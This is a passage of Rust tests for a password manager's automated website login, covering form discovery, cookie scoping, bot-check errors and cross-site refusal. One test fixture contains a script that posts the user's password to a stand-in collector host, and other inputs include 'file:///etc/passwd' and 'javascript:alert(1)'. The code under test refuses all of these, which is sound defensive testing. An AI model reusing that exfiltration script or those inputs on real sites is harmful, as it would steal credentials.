    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(page_with_passkey_option.clone()))
        .mount(&server)
        .await;
    // The password is rejected and the same page comes back.
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "device=abc; Path=/")
                .set_body_string(page_with_passkey_option),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(login_item_with_totp("i1", &login_url));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("the request itself succeeded");

    assert_eq!(
        outcome.awaiting_second_factor, None,
        "a page offering passkeys was read as demanding one"
    );
    assert!(!outcome.looks_authenticated, "a rejected password is not a login");
    assert!(!outcome.used_second_factor, "no TOTP code should have been spent");
}

// ── When the site will not talk to us ─────────────────────────────────────────

/// A bot check is not a JavaScript login, and the error has to say which.
///
/// This test exists because the code got it wrong: pointed at real sites,
/// GitLab's Cloudflare interstitial (403) and Hacker News' 429 were both
/// reported as "this site signs in with JavaScript", which is a message that
/// sends the user looking for a problem that is not there.
#[tokio::test]
async fn a_site_that_refuses_the_login_page_is_not_called_a_javascript_login() {
    for status in [403u16, 429, 503] {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(status)
                    .set_body_string("<html><body>Just a moment…</body></html>"),
            )
            .mount(&server)
            .await;

        let dir = tempfile::tempdir().unwrap();
        let state = test_state(dir.path());
        let login_url = format!("{}/login", server.uri());
        state.vault.write().add_item(login_item("i1", &login_url, false));

        let error = perform_login(
            &state,
            &LoginRequest {
                item_id: "i1".to_string(),
                login_url: None,
            },
            grant_for(&server, "i1").await,
        )
        .await
        .unwrap_err();

        assert_eq!(error, LoginError::SiteRefused { status });
        let message = error.to_string();
        assert!(message.contains(&status.to_string()), "{message}");
        assert!(
            !message.contains("JavaScript"),
            "a bot check was blamed on the site's JavaScript: {message}"
        );
    }
}

/// A 401 on the credential POST is the site saying no. Reporting "signed in"
/// because a cookie came back with it would be worse than saying nothing.
#[tokio::test]
async fn an_error_status_on_the_post_is_not_a_successful_login() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(401)
                .append_header("set-cookie", "sid=anonymous; Path=/")
                .set_body_string("<html><body>Wrong password</body></html>"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("the request itself succeeded");

    assert!(
        !outcome.looks_authenticated,
        "a 401 was reported as a successful sign-in"
    );
}

/// VELA says who it is. A test rather than a comment because the alternative —
/// copying a browser's UA to get past bot checks — is a one-line change someone
/// could make without noticing it is a policy decision, not a bug fix.
#[tokio::test]
async fn the_site_is_told_who_is_asking() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=x; Path=/")
                .set_body_string("ok"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let _ = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should succeed");

    let requests = server.received_requests().await.unwrap();
    let agent = requests[0]
        .headers
        .get("user-agent")
        .expect("a user agent should be sent")
        .to_str()
        .unwrap();
    assert!(agent.starts_with("VELA/"), "{agent}");
    assert!(
        !agent.contains("Mozilla") && !agent.contains("Chrome"),
        "VELA is dressed up as a browser: {agent}"
    );
}

// ── Form discovery ────────────────────────────────────────────────────────────

#[test]
fn a_form_is_read_for_its_action_fields_and_hidden_inputs() {
    let base = Url::parse("https://site.example/login").unwrap();
    let form = discover_form(&login_page("/session"), &base).unwrap();

    assert_eq!(form.action.as_str(), "https://site.example/session");
    assert_eq!(form.password_field, "pw");
    assert_eq!(form.username_field.as_deref(), Some("user_email"));
    assert_eq!(form.extras.get("csrf").map(String::as_str), Some("tok-abc123"));
}

#[test]
fn an_empty_action_posts_back_to_the_page() {
    let base = Url::parse("https://site.example/accounts/login?next=/x").unwrap();
    let form = discover_form(&login_page(""), &base).unwrap();
    assert_eq!(form.action, base);
}

/// A GET form would put the password in the query string, where it lands in the
/// site's access log and the browser's history. Refused, not worked around.
#[test]
fn a_get_form_is_refused() {
    let base = Url::parse("https://site.example/login").unwrap();
    let html = r#"<form method="GET" action="/session">
        <input type="text" name="u"><input type="password" name="p"></form>"#;
    match discover_form(html, &base) {
        Err(LoginError::UnsupportedForm(why)) => assert!(why.contains("GET"), "{why}"),
        other => panic!("expected a refusal, got {other:?}"),
    }
}

/// A JavaScript login has no password form. Guessing would mean posting the
/// credential into whatever field happened to be there.
#[test]
fn a_page_with_no_password_form_is_refused() {
    let base = Url::parse("https://site.example/login").unwrap();
    let html = r#"<html><body><div id="app">loading…</div></body></html>"#;
    assert_eq!(discover_form(html, &base).unwrap_err(), LoginError::NoLoginForm);
}

/// A page can have several forms — search, newsletter, language picker. The one
/// with the password field is the login form.
#[test]
fn the_form_with_the_password_field_is_the_one_used() {
    let base = Url::parse("https://site.example/").unwrap();
    let html = r#"<html><body>
        <form method="POST" action="/search"><input type="text" name="q"></form>
        <form method="POST" action="/signin">
          <input type="email" name="email"><input type="password" name="secret">
        </form></body></html>"#;
    let form = discover_form(html, &base).unwrap();
    assert_eq!(form.action.as_str(), "https://site.example/signin");
    assert_eq!(form.password_field, "secret");
    assert_eq!(form.username_field.as_deref(), Some("email"));
}

// ── Set-Cookie parsing ────────────────────────────────────────────────────────

#[test]
fn cookie_attributes_survive_the_trip() {
    let cookie = parse_set_cookie(
        "sid=xyz; Domain=app.site.example; Path=/dash; Secure; HttpOnly; SameSite=Strict; Max-Age=3600",
        "app.site.example",
    )
    .unwrap();

    assert_eq!(cookie.name, "sid");
    assert_eq!(cookie.value, "xyz");
    assert_eq!(cookie.domain, "app.site.example");
    assert_eq!(cookie.path, "/dash");
    assert!(cookie.secure);
    assert!(cookie.http_only);
    assert_eq!(cookie.same_site.as_deref(), Some("strict"));
    assert!(!cookie.host_only, "an explicit Domain is not host-only");
    let expires = cookie.expires_at.unwrap();
    let now = chrono::Utc::now().timestamp();
    assert!((expires - now - 3600).abs() < 5, "Max-Age was not honoured");
}

/// `HttpOnly` in particular: dropping it in transit would hand page JavaScript
/// a session cookie the site meant to keep away from it.
#[test]
fn a_cookie_with_no_domain_is_host_only() {
    let cookie = parse_set_cookie("sid=xyz", "app.site.example").unwrap();
    assert!(cookie.host_only);
    assert_eq!(cookie.domain, "app.site.example");
    assert_eq!(cookie.path, "/");
    assert!(!cookie.http_only);
    assert!(cookie.expires_at.is_none(), "a session cookie has no expiry");
}

/// Widening to the registrable domain is legitimate; widening past it, or to a
/// domain the sender is not under, is how one host plants a cookie on another.
#[test]
fn a_cookie_may_widen_to_its_own_domain_but_no_further() {
    assert!(parse_set_cookie("a=1; Domain=site.example", "app.site.example").is_some());
    assert!(parse_set_cookie("a=1; Domain=site.example", "site.example").is_some());

    assert!(
        parse_set_cookie("a=1; Domain=example", "app.site.example").is_none(),
        "a bare public suffix was accepted"
    );
    assert!(
        parse_set_cookie("a=1; Domain=other.example", "app.site.example").is_none(),
        "a host set a cookie for a domain it is not under"
    );
    assert!(
        parse_set_cookie("a=1; Domain=co.uk", "evil.co.uk").is_none(),
        "a cookie was allowed to cover every .co.uk site"
    );
}

#[test]
fn expires_is_parsed_and_max_age_wins_over_it() {
    let only_expires =
        parse_set_cookie("a=1; Expires=Wed, 21 Oct 2015 07:28:00 GMT", "site.example").unwrap();
    assert_eq!(only_expires.expires_at, Some(1_445_412_480));

    let both = parse_set_cookie(
        "a=1; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Max-Age=60",
        "site.example",
    )
    .unwrap();
    assert!(both.expires_at.unwrap() > chrono::Utc::now().timestamp());
}

#[test]
fn the_jar_sends_a_cookie_only_where_it_belongs() {
    let mut jar = CookieJar::default();
    let url = Url::parse("https://app.site.example/dash/x").unwrap();
    jar.absorb(
        &[
            "host=1".to_string(),
            "wide=2; Domain=site.example".to_string(),
            "scoped=3; Path=/admin".to_string(),
        ],
        &url,
    );

    let here = jar.header_for(&url).unwrap();
    assert!(here.contains("host=1"), "{here}");
    assert!(here.contains("wide=2"), "{here}");
    assert!(!here.contains("scoped=3"), "a /admin cookie leaked to /dash");

    // A host-only cookie does not follow to a sibling host; the widened one does.
    let sibling = Url::parse("https://other.site.example/").unwrap();
    let there = jar.header_for(&sibling).unwrap();
    assert!(!there.contains("host=1"), "{there}");
    assert!(there.contains("wide=2"), "{there}");
}

// ── Site identity ─────────────────────────────────────────────────────────────

#[test]
fn site_identity_is_the_registrable_domain() {
    let key = |u: &str| site_key(&Url::parse(u).unwrap());
    assert_eq!(key("https://app.github.com/x"), "github.com");
    assert_eq!(key("https://github.com"), "github.com");
    // A public suffix with two labels is not a site boundary anyone can share.
    assert_eq!(key("https://a.foo.co.uk/"), "foo.co.uk");
    // No registrable domain: fall back to the exact host rather than to nothing.
    assert_eq!(key("http://localhost:8080/"), "localhost");
    assert_eq!(key("http://127.0.0.1:8080/"), "127.0.0.1");
}

#[test]
fn only_http_urls_are_login_pages() {
    assert!(normalize_url("file:///etc/passwd").is_none());
    assert!(normalize_url("javascript:alert(1)").is_none());
    assert!(normalize_url("   ").is_none());
    // A bare host is assumed https rather than rejected.
    assert_eq!(
        normalize_url("site.example/login").unwrap().scheme(),
        "https"
    );
}

// ── The success heuristic, reported as one ────────────────────────────────────

/// A rejected password usually means the login form comes back. Saying
/// "signed in" there would be worse than saying nothing.
#[tokio::test]
async fn a_rejected_password_is_not_reported_as_a_login() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=anonymous; Path=/")
                .set_body_string(login_page("/session")),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("the request itself succeeded");

    assert!(
        !outcome.looks_authenticated,
        "the login form came back and we called it a success"
    );
}

/// A real login against a real site, driven by credentials from the environment.
///
/// The last untested claim in M9a: that a production site accepts a credential
/// from a non-browser client and issues a session. Everything else has evidence
/// — the parser against real pages, the core against an independent server, the
/// browser chain end to end — but no real site has ever accepted a real login.
///
/// Credentials come from the environment and never from this file, so whoever
/// runs it is the only one who sees them:
///
///     VELA_LOGIN_URL=https://github.com/login \
///     VELA_LOGIN_USER='...' VELA_LOGIN_PASSWORD='...' \
///     VELA_LOGIN_TOTP='<base32 secret or otpauth:// URI>' \
///     cargo test -p vela-desktop-core --lib real_site_login -- --ignored --nocapture
///
/// The report below is deliberately redacted: cookie *names* and flags, never
/// values; no password, no secret, no code. A session cookie value is a live
/// credential and printing one to a terminal is how it ends up in a scrollback
/// buffer, a screenshot or a paste.
///
/// It really does sign in. Expect the site to notice: a "new sign-in" mail, a
/// device-verification challenge, or a block are all normal responses to a
/// login from an unfamiliar client.
#[tokio::test]
#[ignore = "signs in to a real account; needs VELA_LOGIN_* in the environment"]
async fn real_site_login() {
    let Ok(url) = std::env::var("VELA_LOGIN_URL") else {
        println!("set VELA_LOGIN_URL, VELA_LOGIN_USER, VELA_LOGIN_PASSWORD (and optionally VELA_LOGIN_TOTP)");
        return;
    };
    let username = std::env::var("VELA_LOGIN_USER").unwrap_or_default();
    let password = std::env::var("VELA_LOGIN_PASSWORD").unwrap_or_default();
    let totp = std::env::var("VELA_LOGIN_TOTP").ok().filter(|s| !s.is_empty());
    // Opt in to answering a stronger factor with a TOTP code, the same way a
    // vault item does. Spelled out here rather than defaulted on, because the
    // whole point of the setting is that the downgrade is a decision.
    let allow_downgrade = std::env::var("VELA_LOGIN_ALLOW_DOWNGRADE").is_ok_and(|v| v == "1");

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let now = Utc::now();
    state.vault.write().add_item(VaultItem::Login {
        meta: VaultMeta {
            id: "real".to_string(),
            name: "Real site".to_string(),
            notes: None,
            created_at: now,
            updated_at: now,
            last_modified_device: None,
            favorite: false,
            shared: false,
            share_recipient: None,
        },
        url: url.clone(),
        username,
        pass: password,
        totp,
        app_ids: Vec::new(),
        credential_change_needs_reauth: None,
        allow_second_factor_downgrade: Some(allow_downgrade),
    });

    let parsed = normalize_url(&url).expect("VELA_LOGIN_URL should be a URL");
    let grant = LoginGrant::mint("real".to_string(), site_key(&parsed), true);

    println!("--- in-core login against {} ---", site_key(&parsed));
    match perform_login(
        &state,
        &LoginRequest {
            item_id: "real".to_string(),
            login_url: None,
        },
        grant,
    )
    .await
    {
        Ok(outcome) => {
            println!("looks_authenticated = {}", outcome.looks_authenticated);
            println!("used_second_factor  = {}", outcome.used_second_factor);
            println!("downgraded          = {}", outcome.second_factor_downgraded);
            println!("awaiting            = {:?}", outcome.awaiting_second_factor);
            println!("landing_url         = {}", outcome.landing_url);
            println!("cookies             = {}", outcome.cookies.len());
            for cookie in &outcome.cookies {
                println!(
                    "  {:<28} domain={} host_only={} http_only={} secure={} same_site={:?}",
                    cookie.name,
                    cookie.domain,
                    cookie.host_only,
                    cookie.http_only,
                    cookie.secure,
                    cookie.same_site
                );
            }
            // The question `looks_authenticated` cannot answer.
            //
            // Everything above is inference over what the site sent back, and
            // the GitHub run showed inference getting it wrong. This spends the
            // session on a page the site only serves to a signed-in user, which
            // is the difference between "we think this worked" and "this
            // works". Set VELA_LOGIN_VERIFY_URL to such a page — for GitHub,
            // https://github.com/settings/profile.
            if let Ok(verify_url) = std::env::var("VELA_LOGIN_VERIFY_URL") {
                let jar_header = outcome
                    .cookies
                    .iter()
                    .map(|c| format!("{}={}", c.name, c.value))
                    .collect::<Vec<_>>()
                    .join("; ");
                let client = reqwest::Client::builder()
                    .redirect(reqwest::redirect::Policy::none())
                    .user_agent(super::USER_AGENT)
                    .build()
                    .unwrap();
                match client
                    .get(&verify_url)
                    .header(reqwest::header::COOKIE, jar_header)
                    .send()
                    .await
                {
                    Ok(response) => {
                        let status = response.status();
                        let location = response
                            .headers()
                            .get(reqwest::header::LOCATION)
                            .and_then(|v| v.to_str().ok())
                            .unwrap_or("")
                            .to_string();
                        // A signed-out request to a private page is bounced to
                        // a login or session page; a signed-in one is served.
                        let signed_in = status.is_success()
                            && !location.contains("login")
                            && !location.contains("session");
                        println!("--- verifying the session against {verify_url} ---");
                        println!("status              = {status}");
                        if !location.is_empty() {
                            println!("redirected to       = {location}");
                        }
                        println!("SESSION REALLY WORKS = {signed_in}");
                    }
                    Err(e) => println!("verification failed = {e}"),
                }
            }

            // The claim, checked against the artifact rather than asserted.
            let serialized = serde_json::to_string(&outcome).unwrap();
            for (label, secret) in [
                ("password", std::env::var("VELA_LOGIN_PASSWORD").unwrap_or_default()),
                ("totp secret", std::env::var("VELA_LOGIN_TOTP").unwrap_or_default()),
            ] {
                if !secret.is_empty() {
                    println!(
                        "{label:<19} in response = {}",
                        serialized.contains(&secret)
                    );
                }
            }
        }
        Err(e) => println!("FAILED              = {e}"),
    }
}

// ── Against the real web ──────────────────────────────────────────────────────
//
// Everything above this line reads HTML written by this file, which proves the
// parser agrees with its author and nothing else. `discover_form` is the part
// of M9a with the most guessing in it, and the only honest way to know whether
// it works is to point it at pages someone else wrote.
//
// `#[ignore]`d because it needs the network and because a site can redesign its
// login page at any time — a CI failure caused by GitHub shipping a new form
// would be noise. Run deliberately:
//
//     cargo test -p vela-desktop-core --lib real_login_pages -- --ignored --nocapture
//
// Read-only: these are GETs of public login pages. No credential is sent, and
// `perform_login` is never called.
#[tokio::test]
#[ignore = "hits the live internet"]
async fn real_login_pages_are_read_correctly_or_refused_clearly() {
    let sites = [
        ("GitHub", "https://github.com/login"),
        ("Hacker News", "https://news.ycombinator.com/login"),
        ("GitLab", "https://gitlab.com/users/sign_in"),
        ("Wikipedia", "https://en.wikipedia.org/w/index.php?title=Special:UserLogin"),
        ("Fastmail", "https://app.fastmail.com/login/"),
        ("Reddit", "https://www.reddit.com/login/"),
    ];

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(20))
        .user_agent(super::USER_AGENT)
        .build()
        .unwrap();

    for (name, url) in sites {
        let parsed = Url::parse(url).unwrap();
        let (status, body) = match client.get(url).send().await {
            Ok(response) => {
                let status = response.status().as_u16();
                (status, response.text().await.unwrap_or_default())
            }
            Err(e) => {
                println!("{name:<12} UNREACHABLE  {e}");
                continue;
            }
        };

        // The same order `perform_login` uses: a site that would not serve the
        // page is reported as that, not as a page with no form on it.
        if status >= 400 {
            println!("{name:<12} REFUSED      HTTP {status} (bot check or rate limit)");
            continue;
        }

        match discover_form(&body, &parsed) {
            Ok(form) => println!(
                "{name:<12} OK           action={} user={:?} pass={} extras={:?}",
                form.action,
                form.username_field,
                form.password_field,
                form.extras.keys().collect::<Vec<_>>()
            ),
            Err(e) => println!("{name:<12} REFUSED      {e}"),
        }
    }
}

// ── The M9c prototype, end to end ─────────────────────────────────────────────

/// A site with no form at all: the page's own script builds a JSON request and
/// `fetch`es it. This is the category M9a refuses and the reason the runtime
/// exists — the whole login, through `perform_login`, against a site that a
/// form parser cannot touch.
#[cfg(feature = "js-login")]
#[tokio::test]
async fn a_javascript_only_login_completes_through_the_runtime() {
    use wiremock::matchers::{body_string_contains, header};

    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            r#"<html><body>
            <div id="app">
              <input id="u" type="text"><input id="p" type="password">
            </div>
            <script>
              function onLoginSubmit() {
                fetch("/api/session", {
                  method: "POST",
                  headers: { "Content-Type": "application/json", "X-Csrf": "js-tok-42" },
                  body: JSON.stringify({
                    identifier: document.getElementById("u").value,
                    secret: document.getElementById("p").value
                  })
                });
              }
            </script></body></html>"#,
        ))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/api/session"))
        .and(header("X-Csrf", "js-tok-42"))
        .and(body_string_contains("\"identifier\":\"ada\""))
        .and(body_string_contains(PASSWORD))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=js-session; Path=/; HttpOnly")
                .set_body_string("<html><body>Welcome, Ada</body></html>"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("a JS-only login should complete");

    assert!(outcome.looks_authenticated);
    assert!(outcome.cookies.iter().any(|c| c.name == "sid"));

    // The mock only matched a body carrying the real password and the script's
    // own CSRF header, so reaching here proves the substitution happened after
    // the runtime exited and the script's headers were honoured. And the
    // credential still has no field to travel back in.
    let serialized = serde_json::to_string(&outcome).unwrap();
    assert!(!serialized.contains(PASSWORD), "{serialized}");
    assert!(
        !serialized.contains(crate::js_login::PLACEHOLDER_PASSWORD),
        "{serialized}"
    );
}

/// A script that posts the credential to another host is refused, and nothing
/// is sent. Same rule as the form path's cross-site redirect, applied to a
/// request the page composed itself.
#[cfg(feature = "js-login")]
#[tokio::test]
async fn a_script_that_posts_off_site_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            r#"<html><body><input id="p" type="password">
            <script>
              function onLoginSubmit() {
                fetch("https://collector.example/take", {
                  method: "POST",
                  body: JSON.stringify({ secret: document.getElementById("p").value })
                });
              }
            </script></body></html>"#,
        ))
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap_err();

    assert_eq!(
        error,
        LoginError::CrossSiteRedirect("collector.example".to_string())
    );
}
